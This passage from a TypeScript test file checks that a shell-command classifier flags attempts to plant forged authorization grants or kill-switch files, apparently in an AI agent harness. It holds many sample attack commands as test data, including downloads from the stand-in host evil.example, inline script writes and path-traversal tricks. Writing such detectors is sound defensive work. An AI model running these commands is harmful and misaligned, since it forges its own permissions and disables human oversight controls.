      "msguniq -o .deft/authz/grants/evil.json messages.po",
      "msguniq --output-file .deft/authz/grants/evil.json messages.po",
      "oras.exe pull -o .deft/authz/grants/evil.json ghcr.io/evil/g:latest",
      "/usr/bin/ncat -o .deft/authz/grants/evil.json evil.example 80",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Finding 2: same bins → kill-switch basenames (regular-file plant).
    for (const cmd of [
      "oras pull -o .deft-directive-disable ghcr.io/evil/x:latest",
      "lwp-download -o .deft-directive-disable https://evil.example/x",
      "ncat -o .deft-directive-disable evil.example 80",
      "patch -o .no-deft-directive src.patch",
      "base32 -d -o .deft-directive-disable encoded.b32",
      "lrzip -o .deft-directive-disable file.lrz",
      "unar -o .deft-directive-disable archive.rar",
      "cabextract -d .deft-directive-disable a.cab",
      "ditto src .deft-directive-disable",
      "dpkg-deb -x pkg.deb .deft-directive-disable",
      "hg clone https://evil.example/repo .deft-directive-disable",
      "msguniq -o .no-deft-directive messages.po",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Already-denied #3311 peers stay settings.
    expect(classifyShellAuthzOps("gpg2 -o .deft/authz/grants/evil.json -d secret.gpg")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("rage -d -o .deft/authz/grants/evil.json secret.age")).toContain(
      "settings",
    );
    expect(
      classifyShellAuthzOps("xh -o .deft/authz/grants/evil.json https://evil.example/g.json"),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps("wcurl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
    ).toContain("settings");
    // Ordinary residual-bin destinations stay unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("oras pull -o /tmp/out ghcr.io/example/g:latest")).toEqual([]);
    expect(classifyShellAuthzOps("lwp-download -o /tmp/out https://example.com/a")).toEqual([]);
    expect(classifyShellAuthzOps("ncat -o /tmp/out example.com 80")).toEqual([]);
    expect(classifyShellAuthzOps("patch -o /tmp/out src.patch")).toEqual([]);
    expect(classifyShellAuthzOps("base32 -d -o /tmp/out encoded.b32")).toEqual([]);
    expect(classifyShellAuthzOps("lrzip -o /tmp/out file.lrz")).toEqual([]);
    expect(classifyShellAuthzOps("unar -o /tmp/out archive.rar")).toEqual([]);
    expect(classifyShellAuthzOps("cabextract -d /tmp/out a.cab")).toEqual([]);
    expect(classifyShellAuthzOps("ditto src /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("dpkg-deb -x pkg.deb /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("hg clone https://example.com/repo /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("msguniq -o /tmp/out messages.po")).toEqual([]);
  });

  it("classifies residual writer plants of authz grants and kill-switch as settings (#3354)", () => {
    // Finding 1: residual bins → .deft/authz/**
    for (const cmd of [
      "nc -o .deft/authz/grants/evil.json evil.example 80",
      "nc --output .deft/authz/grants/evil.json evil.example 80",
      "netcat -o .deft/authz/grants/evil.json evil.example 80",
      "netcat --output .deft/authz/grants/evil.json evil.example 80",
      "7zz x a.7z -o.deft/authz/grants",
      "7zz x a.7z -o.deft/authz/grants/evil",
      "msgfmt -o .deft/authz/grants/evil.json messages.po",
      "msgfmt --output-file .deft/authz/grants/evil.json messages.po",
      "msgcat -o .deft/authz/grants/evil.json a.po b.po",
      "msgcat --output-file .deft/authz/grants/evil.json a.po",
      "lz4 -o .deft/authz/grants/evil.json a.lz4",
      "lz4 --output .deft/authz/grants/evil.json a.lz4",
      "lzop -o .deft/authz/grants/evil.json a.lzo",
      "lzop --output .deft/authz/grants/evil.json a.lzo",
      "unrar x archive.rar .deft/authz/grants",
      "rar x archive.rar .deft/authz/grants",
      "aunpack -X .deft/authz/grants archive.tar",
      "aunpack --extract-to .deft/authz/grants archive.tar",
      "atool -X .deft/authz/grants archive.tar",
      "ftpget evil.example .deft/authz/grants/evil.json remote.json",
      "tftp evil.example -c get remote.json .deft/authz/grants/evil.json",
      "sqlite3 db.sqlite .output .deft/authz/grants/evil.json",
      "sqlite3 db.sqlite '.output .deft/authz/grants/evil.json'",
      "sqlite3 db.sqlite .once .deft/authz/grants/evil.json",
      "aunpack -X.deft/authz/grants archive.tar",
      "crane pull ghcr.io/evil/g:latest .deft/authz/grants/evil.json",
      "crane pull -o .deft/authz/grants/evil.json ghcr.io/evil/g:latest",
      "objcopy src.bin .deft/authz/grants/evil.json",
      "nc.exe -o .deft/authz/grants/evil.json evil.example 80",
      "/usr/bin/7zz x a.7z -o.deft/authz/grants",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Finding 2: same bins → kill-switch basenames (regular-file plant).
    for (const cmd of [
      "nc -o .deft-directive-disable evil.example 80",
      "netcat -o .no-deft-directive evil.example 80",
      "7zz x a.7z -o.deft-directive-disable",
      "msgfmt -o .deft-directive-disable messages.po",
      "msgcat -o .no-deft-directive a.po",
      "lz4 -o .deft-directive-disable a.lz4",
      "lzop -o .deft-directive-disable a.lzo",
      "unrar x archive.rar .deft-directive-disable",
      "aunpack -X .deft-directive-disable archive.tar",
      "ftpget evil.example .deft-directive-disable remote.json",
      "sqlite3 db.sqlite .output .deft-directive-disable",
      "crane pull ghcr.io/evil/x:latest .no-deft-directive",
      "objcopy src.bin .deft-directive-disable",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Already-denied #3336 peers stay settings.
    expect(classifyShellAuthzOps("ncat -o .deft/authz/grants/evil.json evil.example 80")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("7z x a.7z -o.deft/authz/grants")).toContain("settings");
    expect(classifyShellAuthzOps("msguniq -o .deft/authz/grants/evil.json messages.po")).toContain(
      "settings",
    );
    // Fail-closed: unknown write-shaped bin with dest flag targeting protected paths.
    expect(classifyShellAuthzOps("weirdbin -o .deft/authz/grants/evil.json")).toContain("settings");
    expect(classifyShellAuthzOps("unknownwriter --output .deft-directive-disable")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("unknownwriter --outfile=.no-deft-directive")).toContain(
      "settings",
    );
    // Ordinary residual-bin destinations stay unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("nc -o /tmp/out example.com 80")).toEqual([]);
    expect(classifyShellAuthzOps("netcat -o /tmp/out example.com 80")).toEqual([]);
    expect(classifyShellAuthzOps("7zz x a.7z -o/tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("msgfmt -o /tmp/out messages.po")).toEqual([]);
    expect(classifyShellAuthzOps("msgcat -o /tmp/out a.po")).toEqual([]);
    expect(classifyShellAuthzOps("lz4 -o /tmp/out a.lz4")).toEqual([]);
    expect(classifyShellAuthzOps("lzop -o /tmp/out a.lzo")).toEqual([]);
    expect(classifyShellAuthzOps("unrar x archive.rar /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("aunpack -X /tmp/out archive.tar")).toEqual([]);
    expect(classifyShellAuthzOps("ftpget example.com /tmp/out remote.json")).toEqual([]);
    expect(classifyShellAuthzOps("sqlite3 db.sqlite .output /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("crane pull ghcr.io/example/g:latest /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("objcopy src.bin /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("weirdbin -o /tmp/out")).toEqual([]);
    // scp `-o` is OpenSSH option, not a file dest (retain bin context; #3354 Greptile P1).
    expect(
      classifyShellAuthzOps("scp -o IdentityFile=.deft-directive-disable host:x /tmp/out"),
    ).toEqual([]);
    expect(classifyShellAuthzOps("scp -o ProxyCommand=none host:g.json /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("cpio -o > /tmp/a.cpio")).toEqual([]);
  });

  it("classifies residual dest-form plants of authz grants and kill-switch as settings (#3382)", () => {
    // Finding 1: residual dest forms → .deft/authz/**
    for (const cmd of [
      "cmake -E copy src.json .deft/authz/grants/evil.json",
      "cmake -E copy_directory src .deft/authz/grants",
      "script -q .deft/authz/grants/evil",
      "script .deft/authz/grants/evil",
      "gallery-dl -d .deft/authz/grants https://evil.example/g",
      "gallery-dl --destination .deft/authz/grants https://evil.example/g",
      "gallery-dl --destination=.deft/authz/grants https://evil.example/g",
      "gallery-dl -d.deft/authz/grants https://evil.example/g",
      "megadl --path .deft/authz/grants https://mega.nz/evil",
      "megadl --path=.deft/authz/grants https://mega.nz/evil",
      "ncftpget evil.example .deft/authz/grants/evil.json remote.json",
      "git apply --directory .deft/authz/grants p.diff",
      "git apply --directory=.deft/authz/grants p.diff",
      "svn export https://evil.example/repo .deft/authz/grants/evil",
      "svn checkout https://evil.example/repo .deft/authz/grants/evil",
      "fossil open repo.fossil .deft/authz/grants/evil",
      "fossil clone https://evil.example/repo .deft/authz/grants/evil",
      "bzr checkout https://evil.example/repo .deft/authz/grants/evil",
      "ed .deft/authz/grants/evil.json",
      "nvim .deft/authz/grants/evil.json",
      "nano .deft/authz/grants/evil.json",
      "cmake.exe -E copy src.json .deft/authz/grants/evil.json",
      "/usr/bin/nvim .deft/authz/grants/evil.json",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Finding 2: same dest forms → kill-switch basenames (regular-file plant).
    for (const cmd of [
      "cmake -E copy src .deft-directive-disable",
      "script -q .no-deft-directive",
      "gallery-dl -d .deft-directive-disable https://evil.example/x",
      "megadl --path .deft-directive-disable https://mega.nz/x",
      "ncftpget evil.example .no-deft-directive remote.json",
      "git apply --directory .deft-directive-disable p.diff",
      "git apply --directory=.no-deft-directive p.diff",
      "svn export https://evil.example/repo .deft-directive-disable",
      "fossil open repo.fossil .no-deft-directive",
      "ed .deft-directive-disable",
      "nvim .no-deft-directive",
      "nano .deft-directive-disable",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Already-denied #3354 peers stay settings.
    expect(classifyShellAuthzOps("nc -o .deft/authz/grants/evil.json evil.example 80")).toContain(
      "settings",
    );
    expect(
      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
    ).toContain("settings");
    // Fail-closed: unknown write-shaped dest flags targeting protected paths (#3382).
    expect(classifyShellAuthzOps("unknownwriter --directory .deft/authz/grants")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("unknownwriter --path=.deft-directive-disable")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("unknownwriter -d .no-deft-directive")).toContain("settings");
    expect(classifyShellAuthzOps("unknownwriter -d.deft/authz/grants")).toContain("settings");
    // Ordinary residual-bin destinations stay unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("cmake -E copy src.json /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("script -q /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("gallery-dl -d /tmp/out https://example.com/a")).toEqual([]);
    expect(classifyShellAuthzOps("megadl --path /tmp/out https://mega.nz/a")).toEqual([]);
    expect(classifyShellAuthzOps("ncftpget example.com /tmp/out remote.json")).toEqual([]);
    expect(classifyShellAuthzOps("git apply --directory /tmp/out p.diff")).toEqual([]);
    expect(classifyShellAuthzOps("svn export https://example.com/repo /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("fossil open repo.fossil /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("nvim /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("ed /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("nano /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("unknownwriter --directory /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("git status")).toEqual([]);
  });

  it("classifies residual dest-form plants after #3382 as settings (#3421)", () => {
    for (const cmd of [
      "git clone https://evil.example/repo .deft/authz/grants/evil",
      "git worktree add .deft/authz/grants/evil HEAD",
      "git submodule add https://evil.example/repo .deft/authz/grants/evil",
      "ex .deft/authz/grants/evil.json",
      "dos2unix -n src.json .deft/authz/grants/evil.json",
      "aws s3 sync s3://evil .deft/authz/grants",
      "aws s3api get-object --bucket b --key k --outfile .deft/authz/grants/evil.json",
      "pijul clone https://evil.example/repo .deft/authz/grants/evil",
      "pg_dump -f .deft/authz/grants/evil.sql db",
      "pg_dump --file .deft/authz/grants/evil.sql db",
      "pg_dump --file=.deft/authz/grants/evil.sql db",
      "convert src.json .deft/authz/grants/evil.json",
      "magick src.json .deft/authz/grants/evil.json",
      "fossil --workdir=.deft/authz/grants open repo.fossil",
      "New-Item -Path .deft/authz/grants/evil.json -ItemType File",
      "New-Item -Path=.deft/authz/grants/evil.json",
      "fallocate -l 1k .deft/authz/grants/evil.json",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    for (const cmd of [
      "git clone https://evil.example/repo .deft-directive-disable",
      "ex .no-deft-directive",
      "dos2unix -n src .deft-directive-disable",
      "aws s3 sync s3://evil .no-deft-directive",
      "pijul clone https://evil.example/repo .deft-directive-disable",
      "pg_dump -f .deft-directive-disable db",
      "convert src .no-deft-directive",
      "magick src .deft-directive-disable",
      "fossil --workdir=.no-deft-directive open repo.fossil",
      "New-Item -Path .deft-directive-disable -ItemType File",
      "fallocate -l 1k .deft-directive-disable",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Already-denied #3400 / #3382 peers stay settings.
    expect(classifyShellAuthzOps("cmake -E copy src .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(
      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
    ).toContain("settings");
    expect(classifyShellAuthzOps("ed .deft/authz/grants/evil.json")).toContain("settings");
    expect(classifyShellAuthzOps("nvim .deft/authz/grants/evil.json")).toContain("settings");
    expect(classifyShellAuthzOps("fossil --workdir .deft/authz/grants open repo.fossil")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("aws s3 cp s3://evil/x .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    // Fail-closed: unknown write-shaped dest flags targeting protected paths (#3421).
    expect(classifyShellAuthzOps("unknownwriter --workdir=.deft/authz/grants")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("unknownwriter --file .deft-directive-disable")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("unknownwriter --separate-git-dir=.deft/authz/grants")).toContain(
      "settings",
    );
    // Read-shaped peers stay unclassifiable (do not treat input flags / git log as dests).
    expect(classifyShellAuthzOps("grep -f .deft/authz/patterns.txt src.txt")).toEqual([]);
    expect(classifyShellAuthzOps("grep --file .deft/authz/patterns.txt src.txt")).toEqual([]);
    expect(classifyShellAuthzOps("grep --file=.deft/authz/patterns.txt src.txt")).toEqual([]);
    expect(classifyShellAuthzOps("Get-Content -Path .deft/authz/state.json")).toEqual([]);
    expect(classifyShellAuthzOps("git log -- .deft/authz/state.json")).toEqual([]);
    expect(classifyShellAuthzOps("git log worktree -- .deft/authz/state.json")).toEqual([]);
    expect(classifyShellAuthzOps("git --no-pager log worktree -- .deft/authz/state.json")).toEqual(
      [],
    );
    expect(
      classifyShellAuthzOps("aws s3 cp src /tmp/out; touch .deft-directive-disable"),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps("git --attr-source HEAD clone https://example .deft/authz/grants/evil"),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps("git --attr-source log clone https://example .deft/authz/grants/evil"),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps(
        "git --unlisted-global log clone https://example .deft/authz/grants/evil",
      ),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps("git --shallow-file x clone https://example .deft/authz/grants/evil"),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps("git --attr-source HEAD worktree add .deft/authz/grants/evil HEAD"),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps(
        "git --shallow-file x submodule add https://example .deft/authz/grants/evil",
      ),
    ).toContain("settings");
    expect(classifyShellAuthzOps("git --attr-source HEAD log -- .deft/authz/state.json")).toEqual(
      [],
    );
    expect(classifyShellAuthzOps("git show submodule -- .deft/authz/state.json")).toEqual([]);
    expect(classifyShellAuthzOps("echo x > .deft/approved-scope-backup/story.json")).toEqual([]);
    expect(classifyShellAuthzOps("echo x > .deft/authz-backup/story.json")).toEqual([]);
    expect(classifyShellAuthzOps("echo x > .deft/foo/../authz-backup/story.json")).toEqual([]);
    expect(classifyShellAuthzOps("echo x > .deft/foo/../approved-scope/story.json")).toContain(
      "settings",
    );
    expect(
      classifyShellAuthzOps("cp forged.json .deft/foo/../approved-scope/story.json"),
    ).toContain("settings");
    expect(classifyShellAuthzOps("echo x > .deft/foo/../authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("echo x > .deft/foo/../.deft-directive-disable")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("echo x > .deft//approved-scope/story.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("echo x > .deft/./approved-scope/story.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("cp forged.json .deft//approved-scope/story.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("echo x > .deft//authz/grants/evil.json")).toContain("settings");
    expect(classifyShellAuthzOps("echo x > .deft/./authz/grants/evil.json")).toContain("settings");
    expect(classifyShellAuthzOps("unix2dos -n src .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("pg_restore --file=.deft/authz/grants/evil.sql dump")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("mogrify -write .deft/authz/grants/evil.json src.png")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("mogrify .deft/authz/grants/evil.json")).toContain("settings");
    expect(classifyShellAuthzOps("mogrify .deft/authz/x extra.png")).toContain("settings");
    // Last-positional dest bins: protected source that writes elsewhere is not dest plant.
    expect(classifyShellAuthzOps("aws s3 cp .deft/authz/x /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("convert .deft/authz/x /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("magick .deft/authz/x /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("aws s3 cp .deft/approved-scope/x /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("convert .deft-directive-disable /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("env aws s3 cp .deft-directive-disable /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("env aws s3 cp .deft/authz/x /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("FOO=1 aws s3 cp .deft/authz/x /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("sudo aws s3 cp src .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("env aws s3 cp src .deft-directive-disable")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("env -C /tmp aws s3 cp .deft/authz/x /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("timeout 5 aws s3 cp .deft/authz/x /tmp/out")).toEqual([]);
    expect(
      classifyShellAuthzOps("env -C /tmp aws s3 cp src .deft/authz/grants/evil.json"),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps(
        "git --list-objects-filter tree:0 clone https://example .deft/authz/grants/evil",
      ),
    ).toContain("settings");
    expect(classifyShellAuthzOps("echo x > foo.deft/authz/story.json")).toEqual([]);
    expect(classifyShellAuthzOps("echo x > x.deft/approved-scope/story.json")).toEqual([]);
    expect(classifyShellAuthzOps("aws s3 cp src .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("convert src .deft/approved-scope/story.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("magick src .no-deft-directive")).toContain("settings");
    // Approved-scope mint symmetry with Write (#3421 MEDIUM).
    expect(classifyShellAuthzOps("cp forged.json .deft/approved-scope/story.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("echo x > .deft/approved-scope/story.json")).toContain("settings");
    expect(
      classifyShellAuthzOps("git clone https://evil.example/r .deft/approved-scope/evil"),
    ).toContain("settings");
    expect(
      classifyHookAuthzOps({
        toolName: "Write",
        shellCommand: null,
        isDirectWrite: true,
      }),
    ).toEqual(["edit"]);
    // Ordinary dests stay unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("git clone https://example.com/repo /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("git worktree add /tmp/out HEAD")).toEqual([]);
    expect(classifyShellAuthzOps("ex /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("dos2unix -n src /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("aws s3 sync s3://example /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("pijul clone https://example.com/repo /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("pg_dump -f /tmp/out db")).toEqual([]);
    expect(classifyShellAuthzOps("convert src /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("fossil --workdir=/tmp/out open repo.fossil")).toEqual([]);
    expect(classifyShellAuthzOps("New-Item -Path /tmp/out -ItemType File")).toEqual([]);
    expect(classifyShellAuthzOps("fallocate -l 1k /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("cat .deft/approved-scope/story.json")).toEqual([]);
    expect(classifyShellAuthzOps("git status")).toEqual([]);
  });

  it("classifies residual dest-form plants after #3421 as settings (#3459)", () => {
    for (const cmd of [
      "ginstall forged.json .deft/authz/grants/evil.json",
      "gcp forged.json .deft/authz/grants/evil.json",
      "gmv forged.json .deft/authz/grants/evil.json",
      "gh repo clone evil/repo .deft/authz/grants/evil",
      "gh -R evil/repo repo clone .deft/authz/grants/evil",
      "/usr/bin/ginstall forged.json .deft/authz/grants/evil.json",
      "glab repo clone evil/repo .deft/authz/grants/evil",
      "hub clone https://evil.example/repo .deft/authz/grants/evil",
      "iwr https://evil.example/g.json -OutFile .deft/authz/grants/evil.json",
      "Invoke-WebRequest https://evil.example/g.json -OutFile .deft/authz/grants/evil.json",
      "fsutil file createnew .deft/authz/grants/evil.json 1",
      "cmd /c copy forged.json .deft/authz/grants/evil.json",
      "copy forged.json .deft/authz/grants/evil.json",
      "tsx -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
      "ts-node -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
      "npm pack --pack-destination .deft/authz/grants",
      "npm pack --pack-destination=.deft/authz/grants",
      "unknownwriter --pack-destination .deft/authz/grants",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    for (const cmd of [
      "ginstall src .deft-directive-disable",
      "gcp src .no-deft-directive",
      "gh repo clone evil/repo .deft-directive-disable",
      "iwr https://evil.example/x -OutFile .no-deft-directive",
      "fsutil file createnew .deft-directive-disable 1",
      "cmd /c copy src .deft-directive-disable",
      "npm pack --pack-destination .no-deft-directive",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Already-denied #3421 peers stay settings.
    expect(classifyShellAuthzOps("install forged.json .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("cp forged.json .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(
      classifyShellAuthzOps("git clone https://evil.example/repo .deft/authz/grants/evil"),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps("Set-Content -Path .deft\\authz\\state.json -Value '{}'"),
    ).toContain("settings");
    // GNU g* prefix is not applied to git/gh/gpg.
    expect(classifyShellAuthzOps("git log -- .deft/authz/state.json")).toEqual([]);
    expect(classifyShellAuthzOps("gh repo view owner/repo")).toEqual([]);
    // Approved-scope mint symmetry (#3459 MEDIUM).
    expect(classifyShellAuthzOps("ginstall forged.json .deft/approved-scope/story.json")).toContain(
      "settings",
    );
    expect(
      classifyShellAuthzOps("iwr https://evil.example/x -OutFile .deft/approved-scope/story.json"),
    ).toContain("settings");
    expect(classifyShellAuthzOps("touch .deft/approved-scope/story.json")).toContain("settings");
    expect(classifyShellAuthzOps("npm pack --pack-destination .deft/approved-scope")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("tsx plant.ts .deft/approved-scope/story.json")).toContain(
      "settings",
    );
    // Ordinary dests stay unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("ginstall forged.json /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("gcp forged.json /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("gh repo clone example/repo /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("glab repo clone example/repo /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("hub clone https://example.com/repo /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("iwr https://example.com/x -OutFile /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("fsutil file createnew /tmp/out 1")).toEqual([]);
    expect(classifyShellAuthzOps("cmd /c copy forged.json /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("npm pack --pack-destination /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps('tsx -e "console.log(1)"')).toEqual([]);
    expect(classifyShellAuthzOps("touch /tmp/out")).toEqual([]);
  });

  it("classifies residual dest-form plants after #3459 as settings (#3529)", () => {
    for (const cmd of [
      "xcopy forged.json .deft/authz/grants/evil.json",
      "robocopy src .deft/authz/grants",
      "move forged.json .deft/authz/grants/evil.json",
      "cmd /c xcopy forged.json .deft/authz/grants/evil.json",
      "cmd /c move forged.json .deft/authz/grants/evil.json",
      "Start-BitsTransfer -Destination .deft/authz/grants/evil.json",
      "bitsadmin /transfer job http://evil.example/g.json .deft/authz/grants/evil.json",
      "Expand-Archive -DestinationPath .deft/authz/grants",
      "Tee-Object -FilePath .deft/authz/grants/evil.json",
      "Export-Csv -Path .deft/authz/grants/evil.json",
      "bun -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
      "deno eval \"Deno.writeTextFileSync('.deft/authz/grants/evil.json','{}')\"",
      "php -r \"file_put_contents('.deft/authz/grants/evil.json','x')\"",
      "unknownwriter --output-dir .deft/authz/grants",
      "unknownwriter --outdir .deft/authz/grants",
      "unknownwriter --target-directory .deft/authz/grants",
      "unknownwriter --destdir .deft/authz/grants",
      "unknownwriter -Destination .deft/authz/grants/evil.json",
      "unknownwriter -DestinationPath .deft/authz/grants",
      "git bundle create .deft/authz/grants/evil.bundle HEAD",
      "git checkout-index --prefix=.deft/authz/grants/",
      "sponge .deft/authz/grants/evil.json",
      "pscp host:g.json .deft/authz/grants/evil.json",
      "jj clone https://evil.example/repo .deft/authz/grants",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    for (const cmd of [
      "ren forged.json .deft-directive-disable",
      "rename forged.json .no-deft-directive",
      "Rename-Item forged.json .deft-directive-disable",
      "xcopy src .deft-directive-disable",
      "robocopy src .no-deft-directive",
      "bun -e \"require('fs').writeFileSync('.deft-directive-disable','')\"",
      "unknownwriter --output-dir .deft-directive-disable",
      "unknownwriter -DestinationPath .no-deft-directive",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Already-denied #3459 peers stay settings.
    expect(classifyShellAuthzOps("cmd /c copy forged.json .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("ginstall forged.json .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(
      classifyShellAuthzOps(
        "tsx -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
      ),
    ).toContain("settings");
    expect(classifyShellAuthzOps("cp forged.json .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    // Approved-scope mint symmetry (#3529 MEDIUM).
    expect(classifyShellAuthzOps("xcopy forged.json .deft/approved-scope/story.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("Expand-Archive -DestinationPath .deft/approved-scope")).toContain(
      "settings",
    );
    expect(
      classifyShellAuthzOps(
        "bun -e \"require('fs').writeFileSync('.deft/approved-scope/story.json','{}')\"",
      ),
    ).toContain("settings");
    expect(classifyShellAuthzOps("robocopy src .deft/approved-scope")).toContain("settings");
    expect(classifyShellAuthzOps("Start-BitsTransfer -Destination .deft/approved-scope")).toContain(
      "settings",
    );
    // Ordinary dests stay unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("xcopy forged.json /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("robocopy src /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("move forged.json /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("cmd /c xcopy forged.json /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("Start-BitsTransfer -Destination /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("Expand-Archive -DestinationPath /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("unknownwriter --output-dir /tmp/out")).toEqual([]);
